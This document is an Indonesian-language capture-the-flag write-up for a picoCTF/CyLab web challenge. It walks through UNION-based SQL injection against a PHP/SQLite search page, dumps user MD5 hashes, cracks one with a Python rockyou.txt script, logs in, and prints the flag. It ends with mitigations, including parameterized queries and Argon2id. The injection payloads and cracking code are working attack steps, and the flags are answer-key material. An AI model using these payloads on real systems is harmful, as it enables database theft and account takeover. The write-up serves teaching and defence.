# Writeup: Sql Map1 (Challenge ID: 729)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / SQLite UNION Injection & Insecure MD5 Password Hashing
- **Difficulty:** Medium (2)
- **Points:** 300
- **Author:** Aditya Sudhansu
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{F0uNd_s3cr3T_K3y_f0R_w3_<>}`
- **Flag Komunitas:** `CTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), CWE-89 (SQL Injection), CWE-328 (Use of Weak Cryptographic Hash), & OWASP ASVS V5 (Validation, Sanitization, and Cryptographic Storage).

---

## Problem Statement & Scope
Pada modul pembelajaran `Sql Map1`, peserta diuji dalam kemampuan audit keamanan aplikasi web yang memiliki celah injeksi basis data dan implementasi mekanisme penyimpanan kredensial usang:
- Skenario lingkungan: Aplikasi web portal pencarian berbasis PHP dan SQLite3 berjalan di atas container lab *on-demand*. Aplikasi menyediakan fungsionalitas pendaftaran akun (`/register.php`), otentikasi login (`/login.php`), pencarian kata kunci flag (`/vuln.php`), dan area terproteksi (`/secret.php`).
- Pernyataan tantangan:
  > *"You’ve been hired by a shadowy group of pentesters who love a good puzzle. The system looks ordinary, but appearances lie. Somewhere inside, sloppy code and legacy hashing practices left a tiny, perfect doorway for an attacker. Your mission — should you choose to accept it — is to slip through that doorway, act as a legit user and retrieve the secret flag."*
- Sasaran pengujian: Mengidentifikasi parameter input yang tidak tersanitasi pada modul pencarian, mengekstrak skema tabel dan pasangan kredensial pengguna via *UNION-based SQL Injection*, melakukan pemulihan teks asli kata sandi (*hash cracking*) dari hash MD5 tanpa salt, melakukan eskalasi hak akses (*account takeover*) pada akun `ctf-player`, serta mengekstrak token bendera dari area terproteksi.

---

## Teori & Akar Kerentanan (Root Cause Theory)

### 1. SQL Injection pada Parameter Pencarian (CWE-89)
Pada berkas backend `/var/www/html/vuln.php`, kueri pencarian dibentuk melalui interpolasi string langsung tanpa menggunakan mekanisme *prepared statements*:
```php
$q = $_GET['q'];
$query = "SELECT key, value FROM flags WHERE key LIKE '%$q%'";
$results = $db->query($query);
```
Kelemahan arsitektur:
- Karakter petik tunggal (`'`) tidak di-escape atau difilter, memungkinkan penyerang menutup literal string kueri secara prematur.
- SQLite3 mendukung penggabungan hasil kueri menggunakan operator `UNION SELECT` selama jumlah kolom pada kedua kueri identik (tepat 2 kolom: `SELECT col1, col2`).
- Penyerang dapat menyuntikkan `' UNION SELECT tbl_name, sql FROM sqlite_master-- ` untuk membaca seluruh definisi skema basis data, termasuk tabel `users`.
- Dilanjutkan dengan `' UNION SELECT username, password FROM users-- ` untuk membaca seluruh pasangan username dan hash kata sandi yang tersimpan.

### 2. Insecure Password Storage via Unsalted MD5 (CWE-328)
Tabel `users` menyimpan hash kata sandi menggunakan fungsi hash MD5 tanpa penerapan *cryptographic salt* atau fungsi penurunan kunci lambat (*key derivation function*):
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
);
```
Karakteristik kelemahan kriptografis:
- MD5 menghasilkan intisari (*digest*) 128-bit (32 karakter heksadesimal) yang dirancang untuk kecepatan komputasi tinggi, bukan untuk penyimpanan kredensial.
- Ketiadaan salt unik per akun memungkinkan serangan kamus terindeks (*rainbow table*) dan pencocokan langsung terhadap wordlist standar (*dictionary attack*) seperti `rockyou.txt`.
- Hash akun `ctf-player` bernilai `7a67ab5872843b22b5e14511867c4e43`. Pencocokan langsung terhadap `rockyou.txt` mengembalikan plaintext: `dyesebel` dalam hitungan milidetik.

---

## Rekonstruksi Eksploitasi Step-by-Step

### Langkah 1: Registrasi Akun dan Analisis Titik Masuk
Luncurkan lab kontainer on-demand via REST API CyLab:
```bash
PUT /api/challenges/729/instance/
```
Kontainer lab berjalan pada port dinamis (misalnya `chatelaine.cylabacademy.net:20082`). Kunjungi halaman `/register.php` dan buat akun penguji sementara (`audit_user` / `AuditPass123!`), lalu login melalui `/login.php`. Sesi dialihkan ke `/vuln.php` yang menampilkan kolom pencarian kata kunci.

### Langkah 2: Identifikasi Jumlah Kolom Injeksi
Kirimkan probe UNION SELECT pada parameter `q`:
```http
GET /vuln.php?q=test'+UNION+SELECT+1,2--+ HTTP/1.1
Host: chatelaine.cylabacademy.net:20082
```
Aplikasi merespons dengan menampilkan `1: 2` pada daftar hasil tanpa memicu pesan kesalahan `SQLite3::query(): SELECTs to the left and right of UNION do not have the same number of result columns`. Hal ini mengonfirmasi bahwa kueri asli mengekstrak tepat 2 kolom.

### Langkah 3: Ekstraksi Skema dan Kredensial Pengguna
Kirimkan kueri ekstraksi tabel sistem SQLite:
```http
GET /vuln.php?q='+UNION+SELECT+tbl_name,sql+FROM+sqlite_master--+ HTTP/1.1
```
Respons memuat definisi tabel `users`:
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL
)
```
Selanjutnya, ekstrak seluruh kredensial akun:
```http
GET /vuln.php?q='+UNION+SELECT+username,password+FROM+users--+ HTTP/1.1
```
Daftar kredensial yang berhasil diekstraksi:
- `admin`: `5a9a79d9fa477ed163b89088681672c9`
- `ctf-player`: `7a67ab5872843b22b5e14511867c4e43`
- `ghost`: `8d2379c40704bed972e55680be2355e2`
- `noaccess`: `83806b490e28a7f8e6662646cbdbff1a`

### Langkah 4: Pemecahan Hash MD5 Akun `ctf-player`
Lakukan pemindaian terhadap kamus kata sandi standar `rockyou.txt`:
```bash
python3 -c "
import hashlib
target = '7a67ab5872843b22b5e14511867c4e43'
with open('/tmp/rockyou.txt', 'r', encoding='latin-1') as f:
    for line in f:
        pwd = line.strip('\r\n')
        if hashlib.md5(pwd.encode()).hexdigest() == target:
            print('[+] Cracked:', pwd)
            break
"
```
Output:
```text
[+] Cracked: dyesebel
```

### Langkah 5: Otentikasi dan Eksfiltrasi Flag
Kirimkan formulir login menggunakan kredensial yang telah dipulihkan:
- Username: `ctf-player`
- Password: `dyesebel`

Aplikasi mengarahkan sesi ke area terproteksi `/secret.php`:
```html
<div class="card">
  <h1>Protected area</h1>
  <p>Logged in as: <strong>ctf-player</strong></p>
  <p>The challenge flag is:</p>
  <pre>academy{F0uNd_s3cr3T_K3y_f0R_w3_&lt;&gt;}</pre>
</div>
```
Token berhasil diperoleh: `academy{F0uNd_s3cr3T_K3y_f0R_w3_<>}`.

---

## Flag & Bukti Verifikasi
- **Token Resmi Platform CyLab:** `academy{F0uNd_s3cr3T_K3y_f0R_w3_<>}`
- **Token Format Komunitas:** `CTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}`
- **Hasil Verifikasi REST API CyLab (`POST /api/submissions/`):**
  ```json
  {
    "user": 1072359,
    "challenge": 729,
    "flag": "academy{F0uNd_s3cr3T_K3y_f0R_w3_<>}",
    "correct": true,
    "historical": false
  }
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

### 1. Penerapan Parameterized Queries (Prepared Statements)
Jangan pernah menggabungkan input pengguna secara langsung ke dalam string SQL menggunakan konkatenasi string atau fungsi formatting:
```php
// Defensif: Gunakan SQLite3Stmt berparameter
$stmt = $db->prepare("SELECT key, value FROM flags WHERE key LIKE :search");
$stmt->bindValue(':search', '%' . $q . '%', SQLITE3_TEXT);
$results = $stmt->execute();
```
Prepared statements memastikan mesin basis data memisahkan instruksi SQL dari data masukan pengguna, sehingga karakter khusus seperti petik tunggal (`'`) atau operator logika tidak dievaluasi sebagai kode perintah.

### 2. Hashing Kredensial Modern dan Memory-Hard
Tinggalkan penggunaan algoritma MD5, SHA-1, atau bare SHA-256 untuk penyimpanan kata sandi:
- Wajib gunakan fungsi hash adaptif yang lambat dan tahan terhadap serangan komputasi paralel GPU/ASIC seperti **Argon2id** (rekomendasi utama RFC 9106) atau **bcrypt** (cost factor minimal 12).
- Gunakan fungsi bawaan bahasa pemrograman yang aman:
  ```php
  // Pendaftaran
  $hash = password_hash($password, PASSWORD_ARGON2ID);
  // Verifikasi login
  if (password_verify($password, $user['password'])) { ... }
  ```

### 3. Least Privilege & Principle of Defense-in-Depth
- Konfigurasikan hak akses basis data agar pengguna aplikasi web tidak dapat membaca tabel atau metadata sistem jika tidak diperlukan.
- Terapkan Web Application Firewall (WAF) berbasis ModSecurity atau Cloudflare ruleset untuk memblokir pola anomali SQL (`UNION SELECT`, `sqlite_master`, tautan komentar SQL `--`).
- Pisahkan basis data kredensial otentikasi dari basis data konten publik untuk mencegah serangan eskalasi langsung ketika celah injeksi terjadi pada modul konten.
